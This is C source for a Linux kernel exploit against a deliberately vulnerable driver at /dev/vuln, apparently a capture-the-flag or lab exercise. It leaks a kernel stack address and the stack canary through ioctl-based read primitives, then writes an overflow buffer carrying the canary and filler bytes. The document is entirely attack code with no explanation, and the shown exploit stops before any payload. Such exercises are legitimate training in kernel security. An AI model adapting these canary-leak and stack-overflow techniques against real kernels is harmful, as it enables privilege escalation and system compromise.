#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdint.h>


int64_t buf[0x400];
int64_t buf2[0x400];
int fd;

unsigned long kernel_stack;
unsigned long cookie;
char *VULN_DRV = "/dev/vuln";


struct rwRequest {
	void *kaddr;
	void *uaddr;
	size_t length;
};



int init(){
    fd = open(VULN_DRV, O_RDWR);
    if(fd < 0) {
        perror("open");
        return 1;
    }
    printf("fd = %d\n", fd);
}

unsigned long leak_stack() {
	struct rwRequest req;
	unsigned long stack;


	req.uaddr = &stack;
	if (ioctl(fd, 0x1337, 0xdeadbeef) < 0) {
		perror("ioctl");
		exit(-1);
	}
	read(fd, &req, 0x100);
	printf("0x%lx\n", stack);
	return stack;
}

unsigned long read64(unsigned long kaddr) {

	struct rwRequest req;
	unsigned long value;;

	req.uaddr = &value;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	if (ioctl(fd, 0x1337, 0xcafebeef) < 0) {
		perror("ioctl");
		exit(-1);
	}
	read(fd, &req, 0x100);
	printf("0x%lx\n", value);
	return value;
}

int main(int argc, char const *argv[])
{
	int idx = 8;
    init();
    kernel_stack = leak_stack();
    cookie = read64(kernel_stack+0x90);
    buf2[idx++] = cookie;
    buf2[idx++] = 0x4141414141414141;
    buf2[idx++] = 0x4141414141414141;
    buf2[idx++] = 0x4141414141414141;
    buf2[idx++] = 0x4141414141414141;
    buf2[idx++] = 0x4141414141414141;
    buf2[idx++] = 0x4141414141414141;
    buf2[idx++] = 0x4141414141414141;
    write(fd, buf2, 0x60);
    return 0;
}